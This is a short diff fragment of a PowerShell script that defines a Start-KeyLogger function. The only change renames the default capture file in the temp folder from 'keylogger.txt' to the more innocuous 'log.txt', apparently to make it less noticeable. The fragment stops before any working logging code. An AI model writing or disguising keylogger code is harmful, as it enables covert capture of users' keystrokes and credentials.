@@ -1,5 +1,5 @@
 #requires -Version 2
-function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
+function Start-KeyLogger($Path="$env:temp\log.txt") 
 {
   # Signatures for API Calls
   $signatures = @'
